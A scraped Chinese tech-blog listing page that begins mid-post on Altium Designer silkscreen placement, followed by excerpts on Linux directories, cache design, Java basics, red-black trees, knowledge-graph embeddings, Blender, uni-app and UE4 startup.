以下是丝印位号调整遵循的原则及常规推荐尺寸。 (1)丝印位号不上阻焊，放置丝印生产之后缺失。 (2)丝印位号清晰，字号推荐字宽/字高尺寸为4/25mil、5/30mil、6/45mil。 (3)保持方向统一性，一般一块PCB上不要超过两个方向摆放，推荐字母在左或在下，如图11-21所示。 图11-21 丝印位号显示方向 (4)对于一些摆布下的丝印标识，可以用放置2D辅助线或者放置方块进行标记，方便读取，如图11-22所示。 图11-22 辅助线及方块 丝印位号的调整方法
Altium Designer提供一个快速调整丝印的方法，即“元器件文本位置”功能，可以快速地把元件的丝印放置在元件的四周或者元件的中心。 (1)选中需要操作的元件。 (2)按快捷键“AP”，进入“元器件文本位置”对话框，如图11-23所示，该对话框中提供“标识符”和“注释”两种摆放方式，这里以“标识符”为例进行说明。 (3)“标识符”提供向上、向下、向右、向左、左上、左下、右上、右下几种方向，可以与小键盘上的数字键进行对应。通过对“元器件文本位置”命令设置快捷键的方法，想让其快速地把选中元件的丝印位号放置到元件的上方时，在小键盘上按数字键“5”和“2”就可以完成此操作，如图11-24所示。其他方向摆放类似，例如，按数字键“5”和“6”放置到元件的右方，按数字键“5”和“8”放置到元件的下方。 图11-23 “元器件文本位置”对话框 图11-24 丝印位号快速放置到元件的上方 免责声明：本文系网络转载，版权归原作者所有。如有问题，请联系我们，谢谢！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0185e965679b4a716df3afaa09dfc75/" rel="bookmark">
			Linux常用指令学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 文件目录结构根目录(/)`/usr``/var ` 系统命令文件目录管理文本编辑解压缩tarziprpm 网络连接screen 文件目录结构 根目录(/) 一级目录功能（作用）/bin/存放系统命令，普通用户和 root 都可以执行。放在 /bin 下的命令在单用户模式下也可以执行/boot/系统启动目录，保存与系统启动相关的文件，如内核文件和启动引导程序（grub）文件等/dev/设备文件保存位置/etc/配置文件保存位置。系统内所有采用默认安装方式（rpm 安装）的服务配置文件全部保存在此目录中，如用户信息、服务的启动脚本、常用服务的配置文件等/home/普通用户的主目录（也称为家目录）。在创建用户时，每个用户要有一个默认登录和保存自己数据的位置，就是用户的主目录，所有普通用户的主目录是在 /home/ 下建立一个和用户名相同的目录。如用户 liming 的主目录就是 /home/liming/lib/系统调用的函数库保存位置/media/挂载目录。系统建议用来挂载媒体设备，如软盘和光盘/mnt/挂载目录。早期 Linux 中只有这一个挂载目录，并没有细分。系统建议这个目录用来挂载额外的设备，如 U 盘、移动硬盘和其他操作系统的分区/misc/挂载目录。系统建议用来挂载 NFS 服务的共享目录。虽然系统准备了三个默认挂载目录 /media/、/mnt/、/misc/，但是到底在哪个目录中挂载什么设备可以由管理员自己决定。例如，笔者在接触 Linux 的时候，默认挂载目录只有 /mnt/，所以养成了在 /mnt/ 下建立不同目录挂载不同设备的习惯，如 /mnt/cdrom/ 挂载光盘、/mnt/usb/ 挂载 U 盘，都是可以的/opt/第三方安装的软件保存位置。这个目录是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录中。不过笔者还是习惯把软件放到 /usr/local/ 目录中，也就是说，/usr/local/ 目录也可以用来安装软件/root/root 的主目录。普通用户主目录在 /home/ 下，root 主目录直接在 “/” 下/sbin/保存与系统环境设置相关的命令，只有 root 可以使用这些命令进行系统环境设置，但也有些命令可以允许普通用户查看/srv/服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据/tmp/临时目录。系统存放临时文件的目录，在该目录下，所有用户都可以访问和写入。建议此目录中不能保存重要数据，最好每次开机都把该目录清空 /usr usr（注意不是 user），全称为 Unix Software Resource，此目录用于存储系统软件资源。FHS 建议所有开发者，应把软件产品的数据合理的放置在 /usr 目录下的各子目录中，而不是为他们的产品创建单独的目录。
Linux 系统中，所有系统默认的软件都存储在 /usr 目录下，/usr 目录类似 Windows 系统中 C:\Windows\ + C:\Program files\ 两个目录的综合体。
子目录功能（作用）/usr/bin/存放系统命令，普通用户和超级用户都可以执行。这些命令和系统启动无关，在单用户模式下不能执行/usr/sbin/存放根文件系统不必要的系统管理命令，如多数服务程序，只有 root 可以使用。/usr/lib/应用程序调用的函数库保存位置/usr/XllR6/图形界面系统保存位置/usr/local/手工安装的软件保存位置。我们一般建议源码包软件安装在这个位置/usr/share/应用程序的资源文件保存位置，如帮助文档、说明文档和字体目录/usr/src/源码包保存位置。我们手工下载的源码包和内核源码包都可以保存到这里。不过笔者更习惯把手工下载的源码包保存到 /usr/local/src/ 目录中，把内核源码保存到 /usr/src/linux/ 目录中/usr/includeC/C++ 等编程语言头文件的放置目录 /var /var 目录用于存储动态数据，例如缓存、日志文件、软件运行过程中产生的文件等。通常，此目录下建议包含如表 所示的这些子目录。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0185e965679b4a716df3afaa09dfc75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68601580ec7e79e00bc197f9eb7b8e06/" rel="bookmark">
			作为架构师,缓存怎么架构,读完这篇文章就够了?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缓存是互联网系统架构中必不可少的一环，近一个月，写了一些缓存的文字。
作为架构师,缓存怎么架构,读完下面的8块超连文章内容就可以了.
1.《什么是进程内缓存？具体怎么玩?》
缓存，可以分为：进程内缓存，缓存集群。文章介绍了：
（1）什么是进程内缓存
（2）进程内缓存的优缺点
（3）进程内缓存保存一致性的3种方案
（4）到底什么时候用进程内缓存
文章也说明，大部分情况下，应该用缓存服务。如今最常见的缓存服务是redis和memcache，遂引出了第二篇文章。
2.《选redis还是memcache，源码怎么说？》
没有最正确，只有最适合。从源码的角度看，到底啥时候用redis，啥时候用memcache。文章介绍了：
（1）复杂数据结构，选择redis
（2）不要把redis当DB和MQ使用
（3）高可用，真的需要么？
（4）内存分配、虚拟内存、网络模型、线程模型上看redis和memcache的差异与选型。
不管是redis还是memcache，缓存服务，有很多误用，遂引出了第三篇文章。
3.《缓存，你真的用对了么？,一文读懂如何正确用对缓存.》
这篇文章介绍了，缓存的一些“值得商榷”的用法：
（1）服务之间，通过缓存传递数据真的合适么？
（2）缓存服务，真的不需要考虑高可用么？
（3）调用方缓存数据，真的合适么？
（4）多个服务，公用缓存实例真的合适么？
了解了常见用法，那么对于缓存的读写，淘汰，一致性有什么常见的问题呢？遂引出了接下来的几篇文章。
4.《缓存，究竟是淘汰删除，还是修改更新,哪种效率更高?》
这一篇文章很重要，也是问的人最多的。《旁路缓存方案的经验实践,一文读懂Cache Aside Pattern》一文也提到了这个问题：
（1）修改缓存，可能会使得代价过高，重复计算
（2）修改缓存，在并发写时，可能数据不一致
结论：应该淘汰缓存，而不是更新缓存。
明确了淘汰，还是修改，接下来需要明确的是：先操作数据库，还是先操作缓存。
5. 先操作数据库，还是先操作缓存?
这里就有争议了，也是这一系列文章被骂的最多的，这里摆出实事和逻辑，大家自行判断。
《旁路缓存方案的经验实践,一文读懂Cache Aside Pattern》
观点：应该先操作数据库，再淘汰缓存
原因：否则，读写并发会导致数据不一致
《用缓存的时候,是先操作缓存，还是数据库？》
观点：应该先淘汰缓存，再操作数据库
原因：否则，原子性被破坏时，会导致数据不一致
不管先操作数据库，还是先操作缓存，都解决不了“写后立刻读，脏数据库入缓存”的问题。
什么是“写后立刻读，脏数据库入缓存”问题？
答：发生写请求后（不管是先操作DB，还是先淘汰Cache），在主从数据库同步完成之前，如果有读请求，都可能发生读Cache Miss，读从库把旧数据存入缓存的情况。此时怎么办呢？遂引出了下一篇文章。
6.《数据库中的数据与缓存不一致，咋办？》
大量的读者反问“为什么不set缓存”，大家可以按照顺序阅读，留言过多，就不一一回复了。
缓存与数据库的不一致，本质是由主从数据库延时引起的，有没有办法优化主从数据库的一致性呢？遂引出了下一篇文章。
7.《主从数据库不一致，怎么办？》
文章提出了三种优化方案，最后一个方案挺有意思，一个很巧妙的方法。
8.番外篇
《到底选redis还是memcache，面试官究竟想考察啥？》
这是一篇聊思路的文章，技术人，不要只会使用，知其然并知其所以然。
这个缓存系列，写了约1个月，兴致勃勃的启动，心情低落的收尾，后续，再换一个话题好了。
希望整体的思路是清晰的，如果有收获，可以赞个鸡腿。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29df4c39e5764ede575448b68e6c9494/" rel="bookmark">
			面试一点通丨缓存，究竟是淘汰删除，还是修改更新,哪种效率更高?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接:面试一点通https://www.msedt.com/infoflow/details/1127
允许cache miss的场景，不管是memcache还是redis，当被缓存的内容变化时，是改修改缓存，还是淘汰缓存？这是今天将要讨论的话题。
问：KV缓存都缓存了一些什么数据？
答：
（1）朴素类型的数据，例如：int
（2）序列化后的对象，例如：User实体，本质是binary
（3）文本数据，例如：json或者html
问：淘汰缓存中的这些数据，修改缓存中的这些数据，有什么差别？
答：
（1）淘汰某个key，操作简单，直接将key置为无效，但下一次该key的访问会cache miss
（2）修改某个key的内容，逻辑相对复杂，但下一次该key的访问仍会cache hit
可以看到，差异仅仅在于一次cache miss。
问：缓存中的value数据一般是怎么修改的？
答：
（1）朴素类型的数据，直接set修改后的值即可
（2）序列化后的对象：一般需要先get数据，反序列化成对象，修改其中的成员，再序列化为binary，再set数据
（3）json或者html数据：一般也需要先get文本，parse成doom树对象，修改相关元素，序列化为文本，再set数据
结论：对于对象类型，或者文本类型，修改缓存value的成本较高，一般选择直接淘汰缓存。
问：对于朴素类型的数据，究竟应该修改缓存，还是淘汰缓存？
答：仍然视情况而定。
案例1：
假设，缓存里存了某一个用户uid=123的余额是money=100元，业务场景是，购买了一个商品pid=456。
分析：如果修改缓存，可能需要：
（1）去db查询pid的价格是50元
（2）去db查询活动的折扣是8折（商品实际价格是40元）
（3）去db查询用户的优惠券是10元（用户实际要支付30元）
（4）从cache查询get用户的余额是100元
（5）计算出剩余余额是100 - 30 = 70
（6）到cache设置set用户的余额是70
为了避免一次cache miss，需要额外增加若干次db与cache的交互，得不偿失。
结论：此时，应该淘汰缓存，而不是修改缓存。
案例2：
假设，缓存里存了某一个用户uid=123的余额是money=100元，业务场景是，需要扣减30元。
分析：如果修改缓存，需要：
（1）从cache查询get用户的余额是100元
（2）计算出剩余余额是100 - 30 = 70
（3）到cache设置set用户的余额是70
为了避免一次cache miss，需要额外增加若干次cache的交互，以及业务的计算，得不偿失。
结论：此时，应该淘汰缓存，而不是修改缓存。
案例3：
假设，缓存里存了某一个用户uid=123的余额是money=100元，业务场景是，余额要变为70元。
分析：如果修改缓存，需要：
（1）到cache设置set用户的余额是70
修改缓存成本很低。
结论：此时，可以选择修改缓存。当然，如果选择淘汰缓存，只会额外增加一次cache miss，成本也不高。
总结：
允许cache miss的KV缓存写场景：
大部分情况，修改value成本会高于“增加一次cache miss”，因此应该淘汰缓存
如果还在纠结，总是淘汰缓存，问题也不大
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f13cf54c2007575fba7e35bdcf7be8b/" rel="bookmark">
			Java中的常见基础类（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		八大包装类 Java里面针对八大基本数据类型都有对应的包装类型的实现，因为基本数据类型只有数据，而包装数据类型新增了很多功能（对数据的操作）
在包装类和基本数据类型之间可以自动进行类型转换~~~
//自动装箱	Long l1 = 1l; Integer i1 = 1; Short s1 = 1; Byte b1 = 1; Boolean bo1 = true; Character c1 = 'a'; Float f1 = 1f; Double d1 = 1d; //自动拆箱 Integer integer = new Integer(12); int a = integer; // ... 当然不只是能用自动装箱，也可以进行手动装箱和拆箱
Integer integer = new Integer(12); //手动拆箱 int a1 = integer.intValue(); //手动装箱 Integer integer2 = Integer.valueOf(1); //其他类型 Integer integer = new Integer(12); int a1 = integer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f13cf54c2007575fba7e35bdcf7be8b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48377d2516fccc3cfe0a03934967884e/" rel="bookmark">
			内部类和异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		内部类 局部内部类有两种：分别是局部类()和匿名局部类
内部类有两种: 正常内部类和静态内部类
1. 四个内部类的名字 正常内部类：OuterClass$InnerClass.class
public class OuterClass { class InnerClass{ } } 静态内部类: OuterClass$InnerClass.class ,和正常内部类的名字是一样的
public class OuterClass { static class InnerClass{ } } 局部内部类：OuterClass$1InnerClass.class,和正常内部类的名字比多了一个数字1
public class OuterClass { public void test(){ class InnerClass{ } } } 匿名内部类: OuterClass$1.class,跟正常内部类相比就是在外部类后面添加了一个数字
public class OuterClass { public static void main(String[] args) { InterfaceForInnerClass inf = new InterfaceForInnerClass(){ @Override public void run() { System.out.println("我是匿名内部类的实现"); } }; } } 2. 内部类的理解 某种意义上来讲，内部类可以看成是类里面的一个成员变量或者局部变量
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48377d2516fccc3cfe0a03934967884e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab76abf6aa437ee0746b39072e885563/" rel="bookmark">
			数据结构之红黑树-动图演示(上)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信搜索【NO编程】，关注这个与众不同的公众号。
个人网站：www.newobject.cc
版权声明：本文为原创文章，转载请注明出处。
红黑树是比较常见的数据结构之一，在 Linux 内核中的完全公平调度器、高精度计时器、多种语言的函数库(如,Java 的 TreeMap)等都有使用。
在学习红黑树之前，先来熟悉一下二叉查找树。
二叉查找树(Binary Search Tree) 二叉查找树，它有一个根节点，且每个节点下最多有只能有两个子节点，左子节点的值小于其父节点，右子节点的值大于其父节点。
插入节点 从根节点向下查找，当新插入节点大于比较的节点时，新节点插入到比较节点的右侧，当小于比较的节点时，插入到比较节点的左侧，一直向下比较大小，找到要插入元素的位置并插入元素。
如图: 依次插入节点[100,50,200,80,300,10]
伪代码(来源 Java TreeMap，有省略和修改): void put(K key, V value) { if (root == null) { root = new Node&lt;&gt;(key, value, null); return; } Node&lt;K,V&gt; t = root; int cmp; // 比较结果 Node&lt;K,V&gt; parent; Comparable&lt;? super K&gt; k = (Comparable&lt;? super K&gt;) key; do { parent = t; cmp = k.compareTo(t.key); if (cmp &lt; 0) t = t.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab76abf6aa437ee0746b39072e885563/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d76adab31ea41c0f542a4a81a8e843b/" rel="bookmark">
			a上标3下标6算法_Word中同时设置上标下标
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在使用Word文档的时候，经常要输入上下标，我们在这里总结一下，以后再遇到就不发愁咯。
0，瞒天过海
此方法不推荐，但是我遇到有人这样过，发出来让大家看一下。
猜猜看哪个是标准的，另个是怎么做出来的。
1，工具栏按钮选中需要设置下标/上标的内容，然后是点击【开始】选项卡下“字体”组里面的上标或下标的工具按钮，就可以达成效果。
2，快捷键
可以看到上图，鼠标放在下标的位置上时，会有一个提示出来，不禁有功能介绍，也有快捷键提示，Ctrl+=就是下标，对应的上标功能是Ctrl+shift++
(+号实际上还是=号，所以也就是Ctrl+Shift+=)
3，在弹出的字体对话框里面设置
选中需要设置的文字，然后可以右键选择“字体”，或者是【开始】选项卡下“字体”组的对话框开启按钮，快捷键的话可以按下Ctrl+D。
出现的字体对话框，可以有字体字号字型颜色等的各种设置。
可以选择上标或者是下标。
4，插入公式-上下标
像上面的方式并不能同时设置上标和下标，很难达到如图的效果。
可以选择【插入】选项卡下-符号组，公式-插入新公式。
选择合适的样式就好。
5，使用域代码来对齐上标下标
可以直接插入域，然后选择EQ域，在域代码后面加上“空格s(上标，下标)”注意是英文符号，然后确定就好。
也可以直接按下Ctrl+F9，插入域代码，输入内容EQ s(1,H)后按下F9达成效果。注意域代码的花括号不能自己手动输入。
本次内容到此结束了，不知道各位小伙伴有没有学会呢？
EQ是Equation，是对公式上很好用的一个域。
大家可以自己动手练习练习哦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e354d750318310e2779e011aa1b150e7/" rel="bookmark">
			linux pid t 头文件_linux多进程实现二个客户端通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2020.07.18
linux分享
●
●
●
#01#前言
前言：
在整理上学期资料同时将部分代码分享，将以代码书写时间为时间线，按优化程度逐步发出，代码均为在linux下c编程。
本文分成3部分：
1、图片演示 2、代码展示及说明
3、下载地址 #OVER#
#02#图片演示
#OVER#
#03#具体代码
说明在下方
fwq.c
/*
* fwq.c
*
* Created on: 2020年5月17日 * Author: wu
*/
#include #include #include #include #include #include #include #include #include "xxlx.h"
int main(int argc, char *argv) {
key_t key=ftok("/home/wu/key",'c');
int msgid = msgget(key,IPC_CREAT|0777);
while(1){
struct message _msg;
memset(&amp;_msg,0,sizeof(struct message));
if(msgrcv(msgid,&amp;_msg,64,c1_fwq,IPC_NOWAIT)&gt;0){
_msg.type=fwq_c2;
msgsnd(msgid,&amp;_msg,64,IPC_NOWAIT);
if(strncmp(_msg.data,"quit",4)==0){
break;
}
}
memset(&amp;_msg,0,sizeof(struct message));
if(msgrcv(msgid,&amp;_msg,64,c2_fwq,IPC_NOWAIT)&gt;0){
_msg.type=fwq_c1;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e354d750318310e2779e011aa1b150e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a02b76ec0a70cf671f9d76e6123efda4/" rel="bookmark">
			java中的 SecureRandom 简单用法(生成随机数)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.生成5位0~9的随机数 SecureRandom random = new SecureRandom(); String returnValue = ""; int randomInt = 0; int range = 9; for(int i=0; i&lt;5; i++ ){ randomInt = random.nextInt(range+1); returnValue = returnValue + randomInt; } System.out.println(returnValue); 做一个简单说明：
(1) range ：是代表随机生成数的最大值。
(2) random.nextInt(range+1) ：获取指定范围的随机数。比如：在上面的代码中range=9，说明生成的随机数在0~8中产生，因为nextInt(a)中a的取值是[0,a) ，是从0开始的，所以上面代码中才要把range+1。
举个例子就能很好理解：
SecureRandom random = new SecureRandom(); String returnValue = ""; int randomInt = 0; int range = 1; for(int i=0; i&lt;5; i++ ){ randomInt = random.nextInt(range); returnValue = returnValue + randomInt; } System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a02b76ec0a70cf671f9d76e6123efda4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b07b9995c460e710a46c7fb15cdb655e/" rel="bookmark">
			知识图谱嵌入的Translate模型汇总（TransE，TransH，TransR，TransD）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自： https://blog.csdn.net/u011984148/article/details/106700448?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-3&amp;spm=1001.2101.3001.4242
导读
一文打尽图嵌入Translate模型，各种模型的动机，优缺点分析。
本文对知识图谱嵌入/知识表示的转换模型进行了简要的总结。你可以从TensorFlow-TransX中找到开源的TensorFlow代码。
知识表示的一些背景知识 通常，我们使用三元组(head, relation, tail)来表示知识。在这里，头和尾是实体。例如，(sky tree, location, Tokyo)。我们可以用独热向量来表示这个知识。但实体和关系太多，维度太大。当两个实体或关系很近时，独热向量无法捕捉相似度。受Wrod2Vec模型的启发，我们想用分布表示来表示实体和关系。
下游任务的应用 以防万一，如果你不熟悉知识图谱，我将介绍一些知识图谱可以使用的应用。
连接预测 连接预测通常被称为预测某个实体与另一个给定实体是否具有特定关系的任务。比如，给定h预测 (r,t)或者给定t预测(h, r)，前者表示为(?,r,t)，后者表示为(h,r,?)。例如，(?, 导演,惊魂)，是预测电影的导演，(毒液,导演,?)，就是预测某个电影被某个人导演。这本质上是一个知识图谱的完善的任务。
推荐系统 推荐系统为用户提供他们可能想要购买或查看的物品的一些建议。在不同的推荐策略中，协同过滤技术取得了显著的成功。但是，并不总是有效，因为用户-物品的交互可能非常稀少。在这种情况下，混合推荐系统通常可以取得更好的性能，混合推荐系统将用户-物品的交互作用与用户或物品的辅助信息相结合。
利用知识图提高协同过滤的质量。具体来说，他们使用存储在KG中的三种类型的信息，包括结构化知识(三元组)、文本知识(例如，一本书或一部电影的文本摘要)和视觉知识(例如，一本书的封面或电影的海报图像)，来推导物品的语义表征。为了对结构化知识进行建模，提出了一种典型的知识图谱的嵌入技术。TransR为每个物品学习了一个结构化的表示。对于另外两种类型的信息，可以使用堆叠去噪自动编码器和堆叠的卷积自动编码器分别提取物品的文本表示和视觉表示。
也有一些应用利用到了知识图谱的嵌入，如实体解析，关系提取，问题回答等。你可以从这篇文章中找到更多的信息：Knowledge Graph Embedding: A Survey of methods and Applications(2017)。
TransE 标题：Translating Embeddings for Modeling Multi-relational Data（2013）
这是转换模型系列的第一部作品。该模型的基本思想是使head向量和relation向量的和尽可能靠近tail向量。这里我们用L1或L2范数来衡量它们的靠近程度。
损失函数是使用了负抽样的max-margin函数。
L(y, y’) = max(0, margin - y + y’)
y是正样本的得分，y'是负样本的得分。然后使损失函数值最小化，当这两个分数之间的差距大于margin的时候就可以了(我们会设置这个值，通常是1)。
由于我们使用距离来表示得分，所以我们在公式中加上一个减号，知识表示的损失函数为：
其中，d是：
这是L1或L2范数。至于如何得到负样本，则是将head实体或tail实体替换为三元组中的随机实体。
看代码：
使用embedding_lookup获得head、relation、tail的向量，并计算(head、relation)和tail之间的距离。
但是这个模型只能处理一对一的关系，不适合一对多/多对一关系，例如，有两个知识，(skytree, location, tokyo)和(gundam, location, tokyo)。经过训练，“sky tree”实体向量将非常接近“gundam”实体向量。但实际上它们没有这样的相似性。
TransH 标题: Knowledge Graph Embedding by Translating on Hyperplanes（2014）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b07b9995c460e710a46c7fb15cdb655e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73e1133b01785315254cfb7f823fa021/" rel="bookmark">
			TransE模型：知识图谱特征经典学习算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自： https://zhuanlan.zhihu.com/p/133532605 需要知道的东西 什么是知识图谱，一种定义是“知识图谱是语义网络上的知识库”，也就是个多关系图。他的目的就是要表示出实体与实体之间的关系，实体指的是现实世界中的事物比如人、地名、概念、药物、公司等，关系则用来表达不同实体之间的某种联系，比如人-“居住在”-北京、张三和李四是“朋友”、逻辑回归是深度学习的“先导知识”等等。又比如人和人之间的关系可以是“朋友”，也可以是“同事”关系。构建这样的一个知识图谱就获得了一个结构化的知识库，当我们执行搜索的时候，就可以通过关键词提取（"张三", "李四", "朋友"）以及知识库上的匹配可以直接获得最终的答案[^fn:1]。
多关系数据的有向图里面的节点就是实体Entities，而边则象征着这样一个三元组(h, l, t)，(head, label, tail)，每个边表示的就是在实体head和tail之间有着名为label的关系。我们要做的是要学习出实体与关系之间的表示。
方法 文章强调使用了embedding 空间的translation来表示关系，从而得到了很好的效果，那么为什么“翻译”能够表示关系呢？实际上我觉得这里的translation表达的应该是转移。也就是说从一个向量转移到另一个向量，而转移的过程就是两个向量的关系，使用null转移向量就可以表示实体之间的等价关系了，所以看起来，用转移是可以表示的。
那么怎么表示转移呢？数轴中，a+b可以表示a向右移动了b个单位，那么h+l也可表示h移动了l个单位，因此答案呼之欲出，要使得h+l=t。
简单来说，TransE就是讲知识图谱中的实体和关系看成两个Matrix。实体矩阵结构为 ，其中n表示实体数量，d表示每个实体向量的维度，矩阵中的每一行代表了一个实体的词向量；而关系矩阵结构为 ，其中r代表关系数量，d表示每个关系向量的维度。TransE训练后模型的理想状态是，从实体矩阵和关系矩阵中各自抽取一个向量，进行L1或者L2运算，得到的结果近似于实体矩阵中的另一个实体的向量，从而达到通过词向量表示知识图谱中已存在的三元组 的关系。
TransE图示
TransE的算法过程如下：
这里注意，entity需要在每次更新前进行归一化，这是通过人为增加embedding的norm来防止Loss在训练过程中极小化。
TransE的Loss function (Hinge Loss Function) 为:
其中 表示x最小值为0, 即 , 表示负例的集合。
因此以norm = L2范数为例，求解正确三元组的h的相对于hinge loss function的梯度：
而L1范数的梯度则以[1,1,-1,1.....]形式出现。
对于模型中Margin的个人理解如下：margin 的作用相当于是一个正确triple与错误triple之前的间隔修正，margin越大，则两个triple之前被修正的间隔就越大，则对于词向量的修正就越严格。
开始阅读论文的时候在纠结一个问题，”这个模型的参数是什么？如何更新？“。后来通过读原文发现其实文章后续中有说明，第3章提到了参数的总量为 ，也就是说Loss更新的参数，是所有entities和relations的Embedding数据，每一次SGD更新的参数就是一个Batch中所有embedding的值。TransE里面SGD和一般机器学习方法或者深度学习中SGD中的参数还是有些区别的。
另外，距离公式 可以取L1 或者 L2 范数。 对于L1 范数， d()是求绝对值结果 ;而对于L2范数, d()有 。其中要注意的是，L1 范数在x = 0处不可导，所以需要使用次微分概念。另一方面，Loss function 希望达到的理想情况是，正确的triple的d(h + r , t) 尽可能的小，而错误triple的 尽可能大，这样才能让总体的loss趋向于0。因此在SGD的update过程中，正例中h 和r 逐渐减小，但t要逐渐增大；反例中 和 要增大，但 要减小。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73e1133b01785315254cfb7f823fa021/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07b88c52dda17b2e349fba668f8de199/" rel="bookmark">
			Blender_6_环切/偏移环切
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		感谢B站辣椒酱
1、环切【Ctrl+R】 1.1、基本操作 快捷键Ctrl + R，出现黄色的标记，移动到想要环切的方向（就像是切蛋糕，一刀下去的位置），按左键确定。
移动鼠标，将蓝色的标记精确移动到目标位置，再按左键确定。
1.2、改变环切数目 Ctrl + R之后，滚动鼠标中间，可以增加或减少平行的环切数。
往上滚增加，往下滚减少。
2、偏移环切【Ctrl+Shift+R】 在某一环切线的基础上，向旁边偏移一定的距离x进行环切。
比如，首先在正方体上进行环切，然后按Ctrl+Shift+R进行偏移环切，可以看到又出来了两条环切线。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/117647a889eda8e3fba73b91303bd347/" rel="bookmark">
			uni-app swiper自定义指示点  和 数字胶囊指示点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用swiper时，需求要把轮播图上的指示点要做成自定义和数字的，做个笔记记录下。
自定义指示点 &lt;template name="swiperBox"&gt; &lt;view class="swiperUnit"&gt; &lt;swiper @change="swiperChange" :interval="4000" :duration="400" class="swiper"&gt; &lt;swiper-item v-for="(item , index) in swiperList" :key="index"&gt; &lt;navigator class="swiper" :url="`/pages/details/${item.url}`"&gt; &lt;image :src="item.img"&gt;&lt;/image&gt; &lt;/navigator&gt; &lt;/swiper-item&gt; &lt;/swiper&gt; &lt;view class="rowDot"&gt; &lt;view v-for="(item , index) in swiperList" :key="index" class="dots"&gt; &lt;view :class="['dot', index === swiperCurrent ? 'active' : '']"&gt;&lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;/template&gt; export default{ name:"swiperBox", props:{ swiperList:{ url:{ type: String, default: '' }, img:{ type: String, default: '' } } }, data(){ return{ current: 0, swiperCurrent: 0 } }, methods:{ swiperChange (e) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/117647a889eda8e3fba73b91303bd347/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/def732e18c33349d5e72e49d4b81c9c2/" rel="bookmark">
			ue4 点击启动_UE4 启动过程 WinMain ... 点击play...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参照官方文档流程图
Game Flow Overview​docs.unrealengine.com 用源码编译的UE4（4.22） 打断点逐步Follow......
EngineSourceRuntimeLaunchPrivateWindowsLaunchWindows.cpp
int32 WINAPI WinMain( _In_ HINSTANCE hInInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ char*, _In_ int32 nCmdShow ) { ... ErrorLevel = GuardedMain( CmdLine, hInInstance, hPrevInstance, nCmdShow ); ... } EngineSourceRuntimeLaunchPrivateLaunch.cpp
#if PLATFORM_WINDOWS int32 GuardedMain( const TCHAR* CmdLine, HINSTANCE hInInstance, HINSTANCE hPrevInstance, int32 nCmdShow ) #else int32 GuardedMain( const TCHAR* CmdLine ) #endif { ... int32 ErrorLevel = EnginePreInit( CmdLine ); ... #if WITH_EDITOR if (GIsEditor) { ErrorLevel = EditorInit(GEngineLoop); } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/def732e18c33349d5e72e49d4b81c9c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/619ac60256cb33297cc2e190ae7c144e/" rel="bookmark">
